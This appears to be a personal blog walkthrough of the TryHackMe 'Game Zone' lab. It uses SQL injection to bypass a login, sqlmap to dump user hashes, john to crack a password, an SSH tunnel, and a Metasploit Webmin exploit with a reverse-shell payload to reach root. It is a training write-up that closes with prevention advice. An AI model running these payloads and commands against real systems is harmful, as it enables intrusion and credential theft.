<!DOCTYPE html>
<html lang="en-us">
  <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
    <meta charset="utf-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1" />

    <meta http-equiv="cache-control" content="max-age=0" />
    <meta http-equiv="cache-control" content="no-cache" />
    <meta http-equiv="expires" content="0" />
    <meta http-equiv="expires" content="Tue, 01 Jan 1980 1:00:00 GMT" />
    <meta http-equiv="pragma" content="no-cache" />

    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
    <link rel="manifest" href="/site.webmanifest">

    <meta name="theme-color" media="(prefers-color-scheme: light)" content="#ffffff" />
    <meta name="theme-color" media="(prefers-color-scheme: dark)" content="#000000" />

    <meta name="description" content="tryhackme: game zone">

    
        <title>tryhackme: game zone | à¼§</title>
    

    
    <link rel="stylesheet" type="text/css" href="/style.min.50e5dce6bdbdda9c021bb01730b34c1639e90db55e0fd1ed0f37771832d1ce47.css" media="all">
  </head>

  <body>
        
        <nav>
          <ul class="menu">
            
                <li><a tabindex="-1" class="menu-link" href="/about/">about</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/cv/">cv</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/posts/">posts</a></li>
            
                <li><a tabindex="-1" class="menu-link" href="/photography/">photography</a></li>
            
          </ul>
        </nav>
        



<div id="single-header">
  <h1>
    tryhackme: game zone
  </h1>
  <div id="single-meta">
    
    
        <span class="datesub">jan 26, 2021 &nbsp;&nbsp; m. jan 29, 2024</span>
      
<span id="tags">
  &nbsp;&nbsp;
   <span>
    <a href="//localhost:1313/tags/cybersec/">#cybersec</a>
  </span>&nbsp; <span>
    <a href="//localhost:1313/tags/tryhackme/">#tryhackme</a>
  </span>&nbsp; <span>
    <a href="//localhost:1313/tags/walkthrough/">#walkthrough</a>
  </span>&nbsp; <span>
    <a href="//localhost:1313/tags/pentesting/">#pentesting</a>
  </span>&nbsp; <span>
    <a href="//localhost:1313/tags/sql/">#sql</a>
  </span>&nbsp;</span>


  </div>
</div>


<div class="content-container">
  

  <main><p>this is a walkthrough for the room &ldquo;game zone&rdquo; on tryhackme. this was the 4th room in the &ldquo;advanced exploitation&rdquo; chapter, part of the &ldquo;offensive pentesting&rdquo; path.</p>
<p>i liked this room because i like sql (yes, i know). database security is a very important component of cybersecurity, as databases are used in almost every type of modern organization. at the end of the walkthrough, i&rsquo;ll also include a link to a resource about preventing database attacks.</p>
<p>tun0 IP address: 10.9.6.194
target IP address: 10.10.141.141</p>
<p>the first thing i always do, is to get an nmap scan going on the target. while that&rsquo;s running, i try to visit the IP address, in case it&rsquo;s a web page.</p>
<p>the nmap scan:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>nmap -sV -Pn 10.10.141.141 -v -T4
</span></span></code></pre></div><p>i want a very quick, one shot enumeration of the open ports and what services they are running.</p>
<p>keep in mind that i&rsquo;m not doing a UDP scan on this network. from my experience, they usually don&rsquo;t bring any more information. rarely, you might discover and have to use some open UDP ports.</p>
<p>visiting the IP address takes us to a website.</p>
<p><p class="imgp">
  <img loading="lazy" src="/landingpage.PNG" alt="landing page"  />
</p>
</p>
<p>the first question of the room is:</p>
<blockquote>
<p>What is the name of the large cartoon avatar holding a sniper on the forum?</p>
</blockquote>
<p>i just happen to know the name of this character. if you don&rsquo;t, you can download the image and do a reverse image search. the search will lead you to the name of the video game: hitman. if you google hitman, you&rsquo;ll know the name of the protagonist (the dude in the photo) is Agent 47.</p>
<p>let&rsquo;s check back on our nmap scan.</p>
<p><p class="imgp">
  <img loading="lazy" src="/nmap1.PNG" alt="nmap"  />
</p>
</p>
<p>we have 2 open ports, according to this scan: port 22 (SSH) and port 80 (HTTP). port 80 is obviously the website. let&rsquo;s dig around on the website a bit more.</p>
<p>as we can see on the landing page, there&rsquo;s a login form. we have 2 options here: either try to use SQL injection (sqli), or try to brute force the login form if sqli is not possible.</p>
<p>a login SQL query usually looks something like:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">WHERE</span> username <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;user&#34;</span> <span style="color:#ff79c6">AND</span> password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;pass&#34;</span>
</span></span></code></pre></div><p>what this query tries to do, is select the database table &ldquo;users&rdquo; and login with the credentials user:pass.</p>
<p>SQLi can be used to break the query. this is usually done by using a string termination character (&rsquo;) along with a true boolean statement:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#f1fa8c">&#39; OR 1=1 -- -
</span></span></span></code></pre></div><p>it&rsquo;s usually some variation of the above. the dashes at the end indicate the start of a comment, which in this case would comment out the rest of the query.</p>
<p>for example, if you entered &ldquo;admin&rdquo; as the username, and &ldquo;&rsquo; OR 1=1 &ndash; -&rdquo; as the password, our query would become:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-sql" data-lang="sql"><span style="display:flex;"><span><span style="color:#ff79c6">SELECT</span> <span style="color:#ff79c6">*</span> <span style="color:#ff79c6">FROM</span> users <span style="color:#ff79c6">where</span> username <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">admin</span> <span style="color:#ff79c6">AND</span> password <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#39; OR 1=1 -- -
</span></span></span></code></pre></div><p>in a weak system that didn&rsquo;t sanitize user input, this would break the login query and log us in as admin, because the password is <strong>always true</strong>.
let&rsquo;s try to login, but let&rsquo;s set the username as &ldquo;&rsquo; OR 1=1 &ndash; -&rdquo;</p>
<p>it worked! the site took us to a page called &ldquo;portal.php&rdquo;.</p>
<p><p class="imgp">
  <img loading="lazy" src="/portal.PNG" alt="portal"  />
</p>
</p>
<p>it seems to be a form where you can search for a game review. hitting search with no game in the field shows us a list of the game reviews on the database.</p>
<p><p class="imgp">
  <img loading="lazy" src="/portal2.PNG" alt="portal2"  />
</p>
</p>
<p>let&rsquo;s try to search for a game and intercept the request in burp suite. we&rsquo;ll save the request as a text file, then feed it to sqlmap (an automated SQLi attack tool).</p>
<p>the intercepted request:</p>
<p><p class="imgp">
  <img loading="lazy" src="/burp.PNG" alt="burp"  />
</p>
</p>
<p>i saved the request as burp.txt.</p>
<p>in sqlmap, we can use the command:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sqlmap -r burp.txt --dbms=mysql --dump
</span></span></code></pre></div><p>what this will do is dump the contents of the entire database. this can be a very noisy operation, so i&rsquo;d advise against it.
the more stealthy approach is to dump the info in little parts, starting with the databases, then the tables inside the databases, and finally the contents of the tables.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sqlmap -r burp.txt --dbms=mysql --dbs
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/databases.PNG" alt="databases"  />
</p>
</p>
<p>we can see 5 databases. &ldquo;information_schema&rdquo; and &ldquo;performance_schema&rdquo; are usually default generated databases, so let&rsquo;s focus on the database &ldquo;db&rdquo;.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sqlmap -r burp.txt --dbms=mysql -D db --tables
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/tables.PNG" alt="tables"  />
</p>
</p>
<p>there are 2 tables: post and users. obviously, you want to dump the contents of the user table to see if there are any hashes or plaintext passwords (rare) stored.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>sqlmap -r burp.txt --dbms=mysql -D db -T users --dump
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/hash.PNG" alt="hash"  />
</p>
</p>
<p>there&rsquo;s a user (agent47), along with their password hash (ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14).</p>
<p>what can we do with this hash? well, we can crack it! to crack it, you can either use john the ripper or hashcat. for this example, let&rsquo;s use john. before we do that though, we need to identify the hash. there are a variety of ways to identify hashes. you can either use an online hash identifier, like the one on <a href="https://hashes.com/en/tools/hash_identifier"  target="_blank" rel="noreferrer nofollow">hashes.com</a>
, or you can tell from experience if you&rsquo;ve been exposed to hashes in the past. i just happen to know that this is a SHA256 hash, so let&rsquo;s work on cracking it with john. first, save the hash to a file.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>john agent47.txt --wordlist=/usr/share/wordlists/rockyou.txt --format=Raw-SHA256
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/john.PNG" alt="john"  />
</p>
</p>
<p>since i&rsquo;ve already performed this crack, the result has been cached and pops up right away for me. normally, you will have to wait a while as john proceeds through the wordlists provided. hashcat might be a better option in some cases, as it can harness your GPU&rsquo;s CUDA cores and crack the hashes a lot faster.</p>
<p>so we now have the credentials agent47:videogamer124. what can we do with this information? if you remember the nmap scan at the beginning, there was an SSH service running on port 22. let&rsquo;s attempt to SSH into agent47&rsquo;s machine.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ssh agent47@10.10.141.141
</span></span></code></pre></div><p><p class="imgp">
  <img loading="lazy" src="/userflag.PNG" alt="user_flag"  />
</p>
</p>
<p>we got our first flag! sweet. so, what now? in most cases, an attacker won&rsquo;t simply stop here. the primary goal of an attacker is to gain root/admin access.</p>
<p>in the case of web applications like game zone, some services may be hidden behind firewalls. in some networks too, some websites may be blocked. what we can do in that case, is to create a reverse SSH tunnel that forwards the blocked traffic to a server that we own, then view it. -L is a local tunnel (YOU &lt;- CLIENT).</p>
<p>first, we have to see the sockets that are running on a host.
from inside the SSH terminal:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ss -tulpn
</span></span></code></pre></div><p>-t displays TCP sockets, -u displays UDP sockets, -l displays listening sockets, -p displays the process using the socket, -n makes sure the hostnames aren&rsquo;t resolved.</p>
<p><p class="imgp">
  <img loading="lazy" src="/tulpn.PNG" alt="sockets"  />
</p>
</p>
<p>we can see that there&rsquo;s a service running on port 10000. the service is hidden, meaning it&rsquo;s probably behind a firewall rule. since we&rsquo;re not root, we can&rsquo;t modify the iptables list. let&rsquo;s create a reverse SSH tunnel and make the service visible to us. on our local machine, run:</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-fallback" data-lang="fallback"><span style="display:flex;"><span>ssh -L 10000:localhost:10000 agent47@10.10.141.141
</span></span></code></pre></div><p>if you visit localhost:10000 in a browser, you&rsquo;ll now see the webmin login page that was previously hidden.</p>
<p><p class="imgp">
  <img loading="lazy" src="/webminlogin.PNG" alt="webmin"  />
</p>
</p>
<p>try logging in with agent47:videogamer124.</p>
<p>it works! and we can see some system information about the service.</p>
<p><p class="imgp">
  <img loading="lazy" src="/webmininfo.PNG" alt="webmin_info"  />
</p>
</p>
<p>the most important thing here is the webmin version: 1.580. we can use this information to search for an exploit relating to this exact version. i like to use searchsploit, because we&rsquo;re going to use metasploit, but you can use google or any other exploit database to find it.</p>
<p><p class="imgp">
  <img loading="lazy" src="/searchsploit.PNG" alt="searchsploit"  />
</p>
</p>
<p>we&rsquo;re going to use the first result: /file/show.cgi Remote Command Execution. this exploits an arbitrary command execution vulnerability in our version of webmin. the vulnerability exists in /file/show.cgi and will allow an authenticated user (agent47) to execute arbitrary commands with root privileges.</p>
<p>fire up msfconsole, and search for this exploit.</p>
<p><p class="imgp">
  <img loading="lazy" src="/msfconsole.PNG" alt="msfconsole"  />
</p>
</p>
<p>now, let&rsquo;s configure our exploit.</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-gdscript3" data-lang="gdscript3"><span style="display:flex;"><span>set payload cmd<span style="color:#ff79c6">/</span>unix<span style="color:#ff79c6">/</span>reverse
</span></span><span style="display:flex;"><span>set PASSWORD videogamer124
</span></span><span style="display:flex;"><span>set USERNAME agent47
</span></span><span style="display:flex;"><span>set RHOSTS localhost
</span></span><span style="display:flex;"><span>set SSL false
</span></span><span style="display:flex;"><span>set LHOST <span style="color:#bd93f9">10.9</span><span style="color:#ff79c6">.</span><span style="color:#bd93f9">6.194</span>
</span></span><span style="display:flex;"><span>set LPORT <span style="color:#bd93f9">4444</span>
</span></span><span style="display:flex;"><span>run
</span></span></code></pre></div><p>if the exploit is successful, we&rsquo;ll get a shell. remember, the reverse ssh tunnel needs to be running for this exploit to work. when you get the shell, upgrade to a proper shell by typing <code>shell</code>. we&rsquo;ll be in the /usr/share/webmin/file directory, and the root flag is stored at /root/root.txt.</p>
<p><p class="imgp">
  <img loading="lazy" src="/root.PNG" alt="root"  />
</p>
</p>
<p>so there it is. we used SQLi to get initial, low privilege access to the network. after some poking around and reverse SSH tunneling, we discovered a CMS called webmin, that had a pretty neat little exploit specific to its version.</p>
<p>how can we prevent SQLi and the host of issues it can open up a private network to?</p>
<ol>
<li>input validation</li>
<li>parametrized queries</li>
<li>stored procedures</li>
<li>escaping</li>
<li>avoiding administrative privileges</li>
<li>web application firewalls (WAF)</li>
</ol>
<p><a href="https://www.ptsecurity.com/ww-en/analytics/knowledge-base/how-to-prevent-sql-injection-attacks/"  target="_blank" rel="noreferrer nofollow">this</a>
 article from ptsecurity breaks down the above prevention methods quite well, and everyone working with databases that contain loads of secure data would be well advised to follow them!</p>
</main>
</div>





<footer>
  <div class="footer-nav">
    
    <a class="next" href="/posts/overpass2/" style="float: right"
      >next: tryhackme: overpass2</a
    >
     
    <a class="previous" href="/posts/cybersec/intro/">previous</a>
    
  </div>
</footer>



<script defer>
  document.addEventListener("keydown", function (e) {
    if (document.activeElement.isContentEditable) {
      return false;
    }
    if (document.activeElement.tagName == "INPUT") {
      return false;
    }
    if (e.altKey || e.ctrlKey || e.shiftKey) {
      return false;
    }
    var key = e.key;
    if (key === "h") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = "/";
    } else if (key === "t") {
      e.preventDefault();
      e.stopPropagation();
      window.location.href = `https://${location.hostname}/tags`;
    } else if (key === "i") {
      e.preventDefault();
      e.stopPropagation();
      const inputs = document.querySelectorAll("input");
      for (let i = 0; i < inputs.length; i++) {
        if (inputs[i].offsetParent !== null) {
          inputs[i].selectionStart = inputs[i].selectionEnd =
            inputs[i].value.length;
          inputs[i].focus();
          break;
        }
      }
    }
    return false;
  });
</script>


<script defer>
  function throttle(fn, wait) {
    var time = Date.now();
    return function () {
      var now = Date.now()
      if (time + wait - now < 0) {
        fn();
        time = now;
      }
    };
  }

  function scrollHandler() {
    const anchors = Array.from(document.querySelectorAll("body h2, body h3"));

    function scrollCallback() {
      var scrollTop = window.pageYOffset || document.documentElement.scrollTop;

      
      for (var i = 0; i < anchors.length; i++) {
        var anchorId = anchors[i].getAttribute("id");
        var link = document.querySelector(
          'nav ul li a[href="#' + anchorId + '"]',
        );
        if (link) {
          link.classList.remove("active-toc");
        }
      }

      
      for (var i = anchors.length - 1; i >= 0; i--) {
        var offsetTop = anchors[i].offsetTop;
        if (scrollTop > offsetTop - 75) {
          var anchorId = anchors[i].getAttribute("id");
          var link = document.querySelector(
            'nav ul li a[href="#' + anchorId + '"]',
          );
          if (link) {
            link.classList.add("active-toc");
            break;
          }
        }
      }
    }

    window.addEventListener(
      "scroll",
      throttle(scrollCallback, 300),
    );
  }
  setTimeout(scrollHandler, 100);
</script>

<script defer>
  function addCopyButtonToCodeBlocks() {
    
    const codeBlocks = document.querySelectorAll('code[class^="language-"]');

    codeBlocks.forEach((codeBlock) => {
      const copyButton = document.createElement("button");
      copyButton.classList.add("copy-code-button");
      copyButton.innerHTML = "copy";

      
      copyButton.addEventListener("click", () => {
        
        const elements = codeBlock.querySelectorAll(".cl");
        let codeToCopy = "";
        elements.forEach((element) => {
          codeToCopy += element.innerText;
        });
        navigator.clipboard.writeText(codeToCopy);

        
        copyButton.innerHTML = "copied!";
        setTimeout(() => {
          copyButton.innerHTML = "copy";
        }, 1500);
      });

      
      codeBlock.parentNode.before(copyButton);
    });
  }
  setTimeout(function () {
    addCopyButtonToCodeBlocks();
  }, 100);
</script>